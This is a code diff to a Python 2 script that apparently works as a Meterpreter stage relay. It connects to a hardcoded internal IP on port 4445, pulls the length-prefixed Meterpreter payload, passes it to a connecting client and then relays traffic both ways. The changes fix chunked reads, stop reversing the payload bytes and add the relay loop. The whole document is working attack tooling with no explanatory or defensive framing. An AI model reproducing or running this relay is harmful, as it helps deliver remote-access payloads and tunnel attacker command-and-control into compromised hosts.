@@ -5,13 +5,12 @@ import sys, socket, thread, ssl, re, base64, time
 import xml.etree.ElementTree as et
 
 HOST = '0.0.0.0'
-PORT = 4444
+PORT = 4445
 BUFSIZE = 4096
 
 def child(sock,certfile='',keyfile=''):
 	global packetA
 	try:
-
 		name="10.1.225.110"
 		print 'hostname:', name
 
@@ -21,14 +20,41 @@ def child(sock,certfile='',keyfile=''):
 		targetsock.connect((name,PORT))
 		
 		print 'receiving packet size'
-		pkt = targetsock.recv(4096)
+		pkt = targetsock.recv(4)
 		pktfixed=str(pkt.encode('hex_codec'))
 		pktfixed2=pktfixed[6:8]+pktfixed[4:6]+pktfixed[2:4]+pktfixed[0:2]
 		print 'receiving meterpreter size: '+str(int(pktfixed2,16))+" HEX: "+pktfixed2+" original: "+pktfixed
-		pkt2 = targetsock.recv(int(pktfixed2,16))
+		pkt2=""
+		MSGLEN=int(pktfixed2,16)
+		while len(pkt2) < MSGLEN:
+			chunk = targetsock.recv(MSGLEN-len(pkt2))
+			if chunk == '':
+				raise RuntimeError("socket connection broken")
+			pkt2 = pkt2 + chunk
 
+		print "sent payload size: "+str(len(pkt2))
 		sock.send(pkt)
-		sock.send(pkt2[::-1])
+		sock.send(pkt2)
+
+		sock.settimeout(1.0)		
+		targetsock.settimeout(1.0)
+		print 'RELAYING'
+		while 1:
+			try:
+				p = sock.recv(int(pktfixed2,16))
+				print "C->S"
+				targetsock.send(p)
+			except socket.error as e:
+				if "timed out" not in str(e):
+					raise e	
+			try:
+				p = targetsock.recv(int(pktfixed2,16))
+				print "S->C"
+				sock.send(p)
+			except socket.error as e:
+				if "timed out" not in str(e):
+					raise e
+
 
 	except Exception as e:
 		print "closing client socket:",e
